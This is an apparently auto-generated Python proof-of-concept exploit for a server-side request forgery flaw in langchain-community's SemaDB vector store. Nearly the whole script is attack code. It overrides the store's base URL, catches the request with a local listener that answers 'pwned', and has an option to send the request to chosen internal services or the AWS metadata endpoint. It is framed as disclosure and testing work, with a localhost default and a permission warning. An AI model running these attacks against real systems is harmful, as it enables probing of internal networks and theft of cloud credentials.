#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-011
# Sink: create_collection
# Auto-generated — run with: python3 ssrf_sink_function_create_collection_create_collection.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via SemaDB BASE_URL in langchain-community

Vulnerability: The SemaDB vector store's create_collection method makes an HTTP POST
request to SemaDB.BASE_URL + '/collections'. The BASE_URL is a class attribute that
can be overridden via constructor arguments (connection_args or kwargs). When using
from_documents() or from_texts(), an attacker can pass a malicious base_url that
redirects the request to an internal service (e.g., 127.0.0.1, cloud metadata).

This PoC demonstrates the SSRF by:
1. Starting a simple HTTP listener on localhost to capture the request
2. Creating a SemaDB instance with a malicious BASE_URL pointing to the listener
3. Triggering the create_collection call which sends the POST request

Safe by default: Uses localhost listener, no external targets.
"""

import requests
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional, List, Dict, Any
import sys
import json

# ============================================================
# Configuration - Change these for testing
# ============================================================
# The malicious base URL that will be used instead of the real SemaDB server
# Default: localhost listener on port 9999
MALICIOUS_BASE_URL = "http://127.0.0.1:9999"
# Alternative targets for testing (uncomment to use):
# MALICIOUS_BASE_URL = "http://169.254.169.254/latest/meta-data/"  # AWS metadata
# MALICIOUS_BASE_URL = "http://127.0.0.1:8080"  # Internal service

# ============================================================
# Simple HTTP server to capture the SSRF request
# ============================================================
class SSRFHandler(BaseHTTPRequestHandler):
    """Handler that logs incoming requests for verification."""
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else b''
        
        print(f"\n[!] SSRF Request Captured!")
        print(f"    Path: {self.path}")
        print(f"    Headers: {dict(self.headers)}")
        print(f"    Body: {body.decode('utf-8', errors='replace')}")
        
        # Send response to make the client happy
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"message": "pwned"}).encode())
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

def start_listener(host: str = '127.0.0.1', port: int = 9999) -> HTTPServer:
    """Start a simple HTTP server to capture the SSRF request."""
    server = HTTPServer((host, port), SSRFHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] SSRF listener started on {host}:{port}")
    return server

# ============================================================
# Minimal SemaDB class to demonstrate the vulnerability
# ============================================================
class SemaDB:
    """
    Minimal reproduction of the vulnerable SemaDB vector store.
    Based on langchain_community/vectorstores/semadb.py
    """
    
    BASE_URL = "https://api.semadb.com"  # Default - will be overridden
    
    def __init__(
        self,
        collection_name: str = "test_collection",
        vector_size: int = 1536,
        distance_strategy: str = "cosine",
        base_url: Optional[str] = None,
        **kwargs: Any
    ):
        """
        Initialize SemaDB with optional base_url override.
        
        In the real implementation, this is called via from_documents/from_texts
        where kwargs can contain 'base_url' or 'connection_args' with base_url.
        """
        self.collection_name = collection_name
        self.vector_size = vector_size
        self.distance_strategy = distance_strategy
        self.headers = {"Content-Type": "application/json"}
        
        # VULNERABILITY: base_url can be overridden via constructor arguments
        if base_url:
            SemaDB.BASE_URL = base_url
            print(f"[*] BASE_URL overridden to: {SemaDB.BASE_URL}")
    
    def _get_internal_distance_strategy(self) -> str:
        """Map distance strategy to internal representation."""
        mapping = {
            "cosine": "cosine",
            "euclidean": "euclidean",
            "dot_product": "dot_product",
        }
        return mapping.get(self.distance_strategy, "cosine")
    
    def create_collection(self) -> bool:
        """
        SINK FUNCTION: Makes HTTP POST to SemaDB.BASE_URL + '/collections'
        
        This is the vulnerable function that sends a request to an attacker-controlled URL.
        """
        payload = {
            "id": self.collection_name,
            "vectorSize": self.vector_size,
            "distanceMetric": self._get_internal_distance_strategy(),
        }
        
        url = SemaDB.BASE_URL + "/collections"
        print(f"\n[*] Sending POST request to: {url}")
        print(f"[*] Payload: {json.dumps(payload, indent=2)}")
        
        try:
            response = requests.post(
                url,
                json=payload,
                headers=self.headers,
                timeout=5
            )
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:200]}")
            return response.status_code == 200
        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error (expected if target is unreachable): {e}")
            return False
        except requests.exceptions.Timeout:
            print("[!] Request timed out")
            return False
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            return False

# ============================================================
# Demonstration of the SSRF attack
# ============================================================
def demonstrate_ssrf():
    """Demonstrate the SSRF vulnerability by redirecting the request."""
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for langchain-community SemaDB")
    print("=" * 60)
    
    # Start a local listener to capture the SSRF request
    listener = start_listener()
    
    print(f"\n[*] Creating SemaDB instance with malicious BASE_URL: {MALICIOUS_BASE_URL}")
    print("[*] This simulates an attacker controlling the 'base_url' parameter")
    print("[*] via from_documents() or from_texts() kwargs\n")
    
    # Create SemaDB instance with attacker-controlled base_url
    # In the real exploit, this would be done via:
    #   SemaDB.from_documents(documents, embedding, base_url="http://attacker.com")
    db = SemaDB(
        collection_name="poc_collection",
        vector_size=768,
        distance_strategy="cosine",
        base_url=MALICIOUS_BASE_URL
    )
    
    print("[*] Triggering create_collection() - this sends the SSRF request...")
    result = db.create_collection()
    
    # Give the listener a moment to process
    time.sleep(0.5)
    
    print(f"\n[*] create_collection returned: {result}")
    print("[*] If you see the SSRF Request Captured message above, the exploit works!")
    
    # Cleanup
    listener.shutdown()
    print("\n[*] Listener stopped. PoC complete.")

# ============================================================
# Alternative: Direct SSRF to internal service
# ============================================================
def ssrf_to_internal_service(target_url: str):
    """
    Demonstrate SSRF to an arbitrary internal service.
    
    Args:
        target_url: The internal URL to target (e.g., http://127.0.0.1:8080/admin)
    """
    print(f"\n[*] Attempting SSRF to: {target_url}")
    
    db = SemaDB(
        collection_name="exploit",
        vector_size=128,
        base_url=target_url
    )
    
    try:
        result = db.create_collection()
        print(f"[*] Request completed with result: {result}")
    except Exception as e:
        print(f"[!] Error during SSRF: {e}")

# ============================================================
# Main execution
# ============================================================
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="SSRF PoC for langchain-community SemaDB",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run default PoC with local listener
  python poc.py
  
  # Test SSRF to a specific internal service
  python poc.py --target http://127.0.0.1:8080/admin
  
  # Test SSRF to cloud metadata endpoint
  python poc.py --target http://169.254.169.254/latest/meta-data/
        """
    )
    
    parser.add_argument(
        "--target",
        type=str,
        default=None,
        help="Target URL for SSRF (default: starts local listener)"
    )
    
    args = parser.parse_args()
    
    if args.target:
        # Direct SSRF to specified target
        print("[!] WARNING: This will send a POST request to the specified target!")
        print("[!] Only use on systems you have permission to test.\n")
        confirm = input("Continue? (y/N): ")
        if confirm.lower() == 'y':
            ssrf_to_internal_service(args.target)
        else:
            print("Aborted.")
    else:
        # Default: demonstrate with local listener
        demonstrate_ssrf()
